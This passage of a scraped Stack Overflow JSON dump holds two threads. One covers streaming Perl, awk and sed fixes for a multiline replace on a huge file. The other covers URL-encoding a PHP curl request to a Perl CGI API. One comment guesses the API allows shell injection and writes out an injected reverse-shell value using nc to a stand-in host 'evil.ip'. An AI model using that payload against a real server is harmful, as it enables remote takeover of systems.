so are in a better position of judging whether the simplicity of this solution is outweighed by the footprint it consumes in memory.</p>\n"}, {"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 2, "last_activity_date": 1569473417, "last_edit_date": 1569473417, "creation_date": 1569472742, "answer_id": 58109650, "question_id": 58108791, "link": "https://stackoverflow.com/questions/58108791/multiline-perl-regex-replace-on-large-file-without-slurp/58109650#58109650", "title": "Multiline perl regex replace on large file without slurp", "body": "<p>Delay printing out the trailing comma and line feed until you know it's ok to print it out.</p>\n\n<pre><code>perl -ne'\n   $_ = $buf . $_;\n   s/^,(?=\\n\\))//;\n   $buf = s/(,\\n)\\z// ? $1 : \"\";\n   print;\n   END { print $buf; }\n'\n</code></pre>\n\n<p>Faster:</p>\n\n<pre><code>perl -ne'\n   print /^\\)/ ? \"\\n\" : \",\\n\" if $f;\n   $f = s/,\\n//;\n   print;\n   END { print \",\\n\" if $f; }\n'\n</code></pre>\n\n<p><a href=\"https://stackoverflow.com/q/41742890/589924\">Specifying file to process to Perl one-liner</a></p>\n"}, {"tags": [], "owner": {"reputation": 2414, "user_id": 5379657, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7ab4a9ac2ee2c7a27f5d976d6a787970?s=128&d=identicon&r=PG&f=1", "display_name": "Jeff Y", "link": "https://stackoverflow.com/users/5379657/jeff-y"}, "is_accepted": false, "score": 1, "last_activity_date": 1569509731, "last_edit_date": 1569509731, "creation_date": 1569507731, "answer_id": 58118922, "question_id": 58108791, "link": "https://stackoverflow.com/questions/58108791/multiline-perl-regex-replace-on-large-file-without-slurp/58118922#58118922", "title": "Multiline perl regex replace on large file without slurp", "body": "<p>This can be done more simply with just awk.</p>\n\n<pre><code>awk 'BEGIN{RS=\".\\n.\"; ORS=\"\"} {gsub(\",\\n)\", \"\\n)\", RT); print $0 RT}'\n</code></pre>\n\n<p>Explanation:</p>\n\n<p><code>awk</code>, unlike Perl, allows a regular expression as the Record Separator, here <code>.\\n.</code> which \"captures\" the two characters surrounding each newline.</p>\n\n<p>Setting <code>ORS</code> to empty prevents <code>print</code> from outputting extra newlines. Newlines are all captured in <code>RS</code>/<code>RT</code>.</p>\n\n<p><code>RT</code> represents the actual text matched by the <code>RS</code> regular expression.</p>\n\n<p>The <code>gsub</code> removes any desired comma from <code>RT</code> if present.</p>\n\n<p>Caveat: You'd need gnu <code>awk</code> (<code>gawk</code>) for this to work. It seems that POSIX-only <code>awk</code> will lack the regexp-<code>RS</code> with <code>RT</code> variable feature, according to <code>gawk</code> man page.</p>\n\n<p>Note: <code>gsub</code> is not really needed, <code>sub</code> is good enough and probably should have been used above.</p>\n"}, {"tags": [], "owner": {"reputation": 46858, "user_id": 967492, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/526ea226101e199d029049dda22a4e58?s=128&d=identicon&r=PG", "display_name": "potong", "link": "https://stackoverflow.com/users/967492/potong"}, "is_accepted": false, "score": 1, "last_activity_date": 1569534387, "creation_date": 1569534387, "answer_id": 58125165, "question_id": 58108791, "link": "https://stackoverflow.com/questions/58108791/multiline-perl-regex-replace-on-large-file-without-slurp/58125165#58125165", "title": "Multiline perl regex replace on large file without slurp", "body": "<p>This might work for you (GNU sed):</p>\n\n<pre><code>sed 'N;s/,\\n)/\\n)/;P;D' file\n</code></pre>\n\n<p>Keep a moving window of two lines throughout the file and if the first ends in a <code>,</code> and the second begins with <code>)</code>, remove the <code>,</code>.</p>\n\n<p>If there is white space and it needs to be preserved, use:</p>\n\n<pre><code>sed 'N;s/,\\(\\s*\\n\\s*)\\)/\\1/;P;D' file\n</code></pre>\n"}], "owner": {"reputation": 3014, "user_id": 987074, "user_type": "registered", "accept_rate": 77, "profile_image": "https://i.stack.imgur.com/rWIWG.jpg?s=128&g=1", "display_name": "bdx", "link": "https://stackoverflow.com/users/987074/bdx"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 189, "favorite_count": 0, "accepted_answer_id": 58109535, "answer_count": 5, "score": 2, "last_activity_date": 1569602431, "creation_date": 1569465018, "question_id": 58108791, "link": "https://stackoverflow.com/questions/58108791/multiline-perl-regex-replace-on-large-file-without-slurp", "title": "Multiline perl regex replace on large file without slurp", "body": "<p>I have a file which is much larger than the amount of memory available on the server which needs to run this script.</p>\n\n<p>In that file, I need to run a basic regex which does a find and replace across two lines at a time. I've looked at using sed, awk, and perl, but I haven't been able to get any of them to work as I need it in this instance.</p>\n\n<p>On a smaller file, the following line does what I need it to:\n<code>perl -0777 -i -pe 's/,\\s+\\)/\\n\\)/g' inputfile.txt</code></p>\n\n<p>In essence, any time a line ends in a comma and the next line starts in a closing parenthesis, remove the comma.</p>\n\n<p>When I tried to run that on my production file I just got the message \"Killed\" in the terminal after a couple of minutes and the file contents were completely erased. I was watching memory usage during that and as expected it was running at 100% and using the swap space extensively.</p>\n\n<p>Is there a way to make that perl command run on two lines at a time instead, or an alternative bash command which might achieve the same result?</p>\n\n<p>If it makes it easier by keeping the file size identical then I also have the option of replacing the comma with a space character.</p>\n"}, {"tags": ["php", "perl", "curl"], "comments": [{"owner": {"reputation": 472, "user_id": 2001559, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/L1bvT.png?s=128&g=1", "display_name": "Maverick", "link": "https://stackoverflow.com/users/2001559/maverick"}, "edited": false, "score": 0, "creation_date": 1569476098, "post_id": 58108405, "comment_id": 102610222, "body": "Since you are getting &#39;400 Bad request&#39;, there may be chance you are missing or proving wrong &#39;key&#39; in your request body. Are you sure all the query parameters are correct ?"}, {"owner": {"reputation": 472, "user_id": 2001559, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/L1bvT.png?s=128&g=1", "display_name": "Maverick", "link": "https://stackoverflow.com/users/2001559/maverick"}, "edited": false, "score": 0, "creation_date": 1569476362, "post_id": 58108405, "comment_id": 102610334, "body": "I am no PHP expert, but looking again, is that the correct way to pass query param in curl ? <a href=\"http://agichevski.com/2014/01/21/php-curl-post-and-get-methods/\" rel=\"nofollow noreferrer\">agichevski.com/2014/01/21/php-curl-post-and-get-methods</a> . You should have &#39;&amp;&#39; between them"}, {"owner": {"reputation": 15161, "user_id": 1067003, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/e3af2bd4b5604b0b661b5e6646544eba?s=128&d=identicon&r=PG", "display_name": "hanshenrik", "link": "https://stackoverflow.com/users/1067003/hanshenrik"}, "reply_to_user": {"reputation": 472, "user_id": 2001559, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/L1bvT.png?s=128&g=1", "display_name": "Maverick", "link": "https://stackoverflow.com/users/2001559/maverick"}, "edited": false, "score": 0, "creation_date": 1569482065, "post_id": 58108405, "comment_id": 102612727, "body": "@Maverick you&#39;re right on the second point, that is NOT the correct way to add url parameters, and his url is invalid. if you read section 2.1 of <a href=\"https://www.rfc-editor.org/rfc/rfc3986.txt\" rel=\"nofollow noreferrer\">RFC3986</a>, you&#39;ll find that the spaces in his url actually has to be encoded as <code>%20</code> - but it isn&#39;t. the correct way to add them in PHP is by using the urlencode() or rawurlencode() or http_build_query() functions.."}, {"owner": {"reputation": 193, "user_id": 6175605, "user_type": "registered", "accept_rate": 58, "profile_image": "https://www.gravatar.com/avatar/f98957ca114e2ca1b3e06df1b7ac725f?s=128&d=identicon&r=PG&f=1", "display_name": "icedev", "link": "https://stackoverflow.com/users/6175605/icedev"}, "reply_to_user": {"reputation": 15161, "user_id": 1067003, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/e3af2bd4b5604b0b661b5e6646544eba?s=128&d=identicon&r=PG", "display_name": "hanshenrik", "link": "https://stackoverflow.com/users/1067003/hanshenrik"}, "edited": false, "score": 0, "creation_date": 1569543323, "post_id": 58108405, "comment_id": 102640328, "body": "@hanshenrik  Yes I know it is not the correct way to add url parameters, the documentation sucks that&#39;s why I just tried accessing the endpoint directly at the browser. Here&#39;s a documentation they gave us  <a href=\"https://www.winquote.net/signup/rn/WQ-ServiceAPI-SL-XML-1.5-CA.txt\" rel=\"nofollow noreferrer\">Documentation</a>"}, {"owner": {"reputation": 193, "user_id": 6175605, "user_type": "registered", "accept_rate": 58, "profile_image": "https://www.gravatar.com/avatar/f98957ca114e2ca1b3e06df1b7ac725f?s=128&d=identicon&r=PG&f=1", "display_name": "icedev", "link": "https://stackoverflow.com/users/6175605/icedev"}, "reply_to_user": {"reputation": 472, "user_id": 2001559, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/L1bvT.png?s=128&g=1", "display_name": "Maverick", "link": "https://stackoverflow.com/users/2001559/maverick"}, "edited": false, "score": 0, "creation_date": 1569543433, "post_id": 58108405, "comment_id": 102640343, "body": "@Maverick sorry for the late response, Yes it is correct because I can access it directly when I type it in the browser&#39;s URL you can check the image here <a href=\"https://irt-cdn.multiscreensite.com/73389760d5654f76a6bb8be8bd19f192/dms3rep/multi/winqoute.png\" rel=\"nofollow noreferrer\">Browser response</a>  The commands are PERL parameters equivalent in PHP I guess?(-cv1.5 -cedv1.0.16.10.11 etc)"}, {"owner": {"reputation": 15161, "user_id": 1067003, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/e3af2bd4b5604b0b661b5e6646544eba?s=128&d=identicon&r=PG", "display_name": "hanshenrik", "link": "https://stackoverflow.com/users/1067003/hanshenrik"}, "edited": false, "score": 0, "creation_date": 1569566164, "post_id": 58108405, "comment_id": 102645276, "body": "is it just me or does that api look vulnerable to shell injection / remote code execution? wonder what would happen if you ended that command with <code>(space)&amp; nohup nc evil.ip 4444 \u2013e &#47;bin&#47;sh</code>"}], "answers": [{"comments": [{"owner": {"reputation": 15161, "user_id": 1067003, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/e3af2bd4b5604b0b661b5e6646544eba?s=128&d=identicon&r=PG", "display_name": "hanshenrik", "link": "https://stackoverflow.com/users/1067003/hanshenrik"}, "edited": false, "score": 0, "creation_date": 1569565728, "post_id": 58128483, "comment_id": 102645082, "body": "for the record, that translates to: <code>CURLOPT_URL =&gt; &quot;https:&#47;&#47;www.winquote.net&#47;cgi-bin&#47;compete.pl?dc=&quot;.rawurlenco&zwnj;&#8203;de(&quot;-cv1.5 -ccca -qt0 -pccaXXXXXXXXX -rt0 -dob11061992 -gen1 -rR -fa500000 -pg0 -pi4 -lc1 -pm0 -rc0 -rop0 -langen -fmt -ceilp -faEXACT&quot;)</code>  (and no, it does not translate to urlencode(), it translates to <b>raw</b>urlencode())"}, {"owner": {"reputation": 193, "user_id": 6175605, "user_type": "registered", "accept_rate": 58, "profile_image": "https://www.gravatar.com/avatar/f98957ca114e2ca1b3e06df1b7ac725f?s=128&d=identicon&r=PG&f=1", "display_name": "icedev", "link": "https://stackoverflow.com/users/6175605/icedev"}, "edited": false, "score": 0, "creation_date": 1569797760, "post_id": 58128483, "comment_id": 102701904, "body": "@Maverick will try that out! Thank you for the information"}, {"owner": {"reputation": 193, "user_id": 6175605, "user_type": "registered", "accept_rate": 58, "profile_image": "https://www.gravatar.com/avatar/f98957ca114e2ca1b3e06df1b7ac725f?s=128&d=identicon&r=PG&f=1", "display_name": "icedev", "link": "https://stackoverflow.com/users/6175605/icedev"}, "reply_to_user": {"reputation": 15161, "user_id": 1067003, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/e3af2bd4b5604b0b661b5e6646544eba?s=128&d=identicon&r=PG", "display_name": "hanshenrik", "link": "https://stackoverflow.com/users/1067003/hanshenrik"}, "edited": false, "score": 0, "creation_date": 1569797829, "post_id": 58128483, "comment_id": 102701915, "body": "@hanshenrik I will try that as well thanks for the info! Will try your suggestions and get back to you!"}], "tags": [], "owner": {"reputation": 472, "user_id": 2001559, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/L1bvT.png?s=128&g=1", "display_name": "Maverick", "link": "https://stackoverflow.com/users/2001559/maverick"}, "is_accepted": false, "score": 3, "last_activity_date": 1569563172, "creation_date": 1569563172, "answer_id": 58128483, "question_id": 58108405, "link": "https://stackoverflow.com/questions/58108405/how-to-get-the-response-of-perl-post-from-curl-php/58128483#58128483", "title": "How to get the response of Perl Post from Curl PHP", "body": "<p>Have a look at <a href=\"https://stackoverflow.com/questions/10246734/white-spaces-in-postfields-in-php-curl\">White spaces in postFields in PHP Curl</a> which may answer your question.</p>\n\n<p>The only issue here is the query param are not proper and '400' response is saying you so. In browser you you look the spaces are converted to '%20'.The browser has done that work for you. You have to do the similar thing i.e. encode your query parameter because of the spaces before doing the post request.</p>\n\n<p>From <a href=\"https://curl.haxx.se/docs/manpage.html#--data-urlencode\" rel=\"nofollow noreferrer\">https://curl.haxx.se/docs/manpage.html#--data-urlencode</a></p>\n\n<blockquote>\n  <p>--data-urlencode </p>\n  \n  <p>(HTTP) This posts data, similar to the other -d, --data options with\n  the exception that this performs URL-encoding.</p>\n  \n  <p>To be CGI-compliant, the  part should begin with a name followed\n  by a separator and a content specification. The  part can be\n  passed to curl using one of the following syntaxes:</p>\n</blockquote>\n"}], "owner": {"reputation": 193, "user_id": 6175605, "user_type": "registered", "accept_rate": 58, "profile_image": "https://www.gravatar.com/avatar/f98957ca114e2ca1b3e06df1b7ac725f?s=128&d=identicon&r=PG&f=1", "display_name": "icedev", "link": "https://stackoverflow.com/users/6175605/icedev"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 148, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1569563172, "creation_date": 1569461488, "last_edit_date": 1569462764, "question_id": 58108405, "link": "https://stackoverflow.com/questions/58108405/how-to-get-the-response-of-perl-post-from-curl-php", "title": "How to get the response of Perl Post from Curl PHP", "body": "<p>Good day! My client gave us an API endpoint where the response is XML when you pass in some commands, I would like to know if there's a way where we can run the endpoint in the PHP and get the response back, I have tried using PHP curl but the response shows 400 or bad request. I can access the endpoint with the commands/parameters in the URL browser so it works. But when I try it using curl, there is no response in it. Is this possible, or am I doing something wrong with my code?</p>\n\n<pre><code>$curl = curl_init();\n\ncurl_setopt_array($curl, array(\n  CURLOPT_URL =&gt; \"https://www.winquote.net/cgi-bin/compete.pl?dc=-cv1.5 -ccca -qt0 -pccaXXXXXXXXX -rt0 -dob11061992 -gen1 -rR -fa500000 -pg0 -pi4 -lc1 -pm0 -rc0 -rop0 -langen -fmt -ceilp -faEXACT\",\n  CURLOPT_RETURNTRANSFER =&gt; true,\n  CURLOPT_ENCODING =&gt; \"\",\n  CURLOPT_MAXREDIRS =&gt; 10,\n  CURLOPT_TIMEOUT =&gt; 30,\n  CURLOPT_HTTP_VERSION =&gt; CURL_HTTP_VERSION_1_1,\n  CURLOPT_CUSTOMREQUEST =&gt; \"POST\"\n));\n\n$response = curl_exec($curl);\n$err = curl_error($curl);\n\ncurl_close($curl);\n\nif ($err) {\n  echo \"cURL Error #:\" . $err;\n} else {\n  echo $response;\n}\n</code></pre>\n"}]